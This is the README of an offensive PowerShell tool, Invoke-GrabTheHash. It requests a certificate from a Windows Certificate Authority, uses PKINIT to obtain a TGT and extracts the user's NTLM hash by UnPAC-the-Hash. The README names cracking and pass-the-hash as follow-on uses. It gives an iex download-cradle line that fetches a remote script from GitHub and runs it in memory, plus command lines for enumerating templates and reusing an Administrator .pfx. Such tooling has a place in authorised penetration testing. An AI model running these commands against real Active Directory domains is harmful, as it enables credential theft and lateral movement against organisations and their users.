# Invoke-GrabTheHash
Requests a certificate from a Windows Certificate Authority (CA) for the Current Session User's TGT, uses PKINIT to obtain a TGT for the same user, then performs the UnPAC-the-Hash technique to extract the user's NTLM hash.

This approach can be valuable in situations where an account's TGT has been compromised. Gaining access to the account hash allows for further actions such as cracking it to retrieve the user plain-text password, pass-the-hash attacks, or acquiring a new TGT if the existing one has expired.

### Run as follows
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-GrabTheHash/main/Invoke-GrabTheHash.ps1')
```
```
Invoke-GrabTheHash
```

### Specify a target Domain
```
Invoke-GrabTheHash -Domain <domain.name>
```

### Enumerate for Certificate Templates
```
Invoke-GrabTheHash -CertTemplates
```

### Specify a Certificate Template to use
By default, the "User" template is used to request a certificate
```
Invoke-GrabTheHash -TemplateName <template_name>
```

### Specify the CA Name
```
Invoke-GrabTheHash -CAName "CA01.domain.local\domain-CA01-CA"
```

### Specify the User Account Name
This must correspond to the TGT Client Name in your current session
```
Invoke-GrabTheHash -CN <samaccountname>
```

### Provide a .pfx file
You can also reuse a previously obtained .pfx to get the user hash

Make sure you provide the full path to the .pfx file, as well as the CN and Domain information
```
Invoke-GrabTheHash -PFX C:\Users\Senna\Downloads\Administrator.pfx -Domain ferrari.local -CN Administrator
```
